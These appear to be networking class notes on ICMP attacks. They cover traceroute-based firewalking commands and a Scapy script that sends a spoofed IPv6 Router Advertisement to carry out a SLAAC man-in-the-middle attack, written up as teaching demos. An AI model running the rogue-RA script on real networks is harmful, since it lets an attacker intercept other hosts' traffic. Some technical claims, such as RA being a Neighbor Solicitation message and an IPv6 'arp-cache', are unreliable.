# Network Layer Commands

Common ICMP attacks

- Fire-walking - Using traceroute and TTLs to map out a network. Using traceroute with TCP and UDP protocols an attacker could map the open ports on a firewall.
> DEMO Firewalking
- When performing traceroute. Linux will use UDP as its default. Windows will use ICMP Echo Requests as its default. Linux will require sudo when specifying any traceroute other than the default.
``` traceroute 8.8.8.8```
- Using traceroute with TCP. This will use TCP port 80 as the default.
```sudo traceroute 8.8.8.8 -T```
- Using traceroute with TCP and a different port.
```sudo traceroute 8.8.8.8 -T -p 443```
- Using traceroute with UDP and a different port.
```sudo traceroute 8.8.8.8 -U -p 123```
- Using traceroute with ICMP (Windows Default)
```sudo traceroute 8.8.8.8 -I```

- Man-in-th-Middle (MitM) attack with SLAAC - It is possible for a malicious actor to take advantage of SLAAC to create a MitM attack by impersonating a IPv6 router. IPv6 is not able to leverage ARP in order to perform MAC to IP resolutions for the local network. IPv6 utilizes a sub-set of the ICMPv6 protocol called "Neighbor Solicitation (NS)". One particular NS message called Router Advertisements (RA) messages are normally sent by routers to advertise the local network IPv6 Prefix. In addition to the prefix, these messages advertise the MAC address of the router. The hosts will accept this mesages and append their Interface-Id to generate their 128-bit IPv6 address for remote communication. If a malicious actor has percistance on the network they can send crafted RA messages for IPv6 clients to accept. By accepting these RA messages the hosts will record and save the sending MAC address as its "gateway" in the arp-cache.
  - DEMO: Performing a ICMPv6 SLAAC MitM attack with Scapy
```
a = IPv6()
a.dst = "ff02::1"   #IPv6 multicast for RA

b = ICMPv6ND_RA()

c = ICMPv6NDOptSrcLLAddr()
c.lladdr = "your MAC"    #This is to add to their ARP cache

d = ICMPv6NDOptMTU()

e = ICMPv6NDOptPrefixInfo()
e.prefixlen= 64     #Specify the prefix length needed
e.prefix= "2001:abcd:1234:abcd::"  #Can be any prefix that is not reserved already

a.show()
b.show()
c.show()
d.show()
e.show()

send(a/b/c/d/e)
```












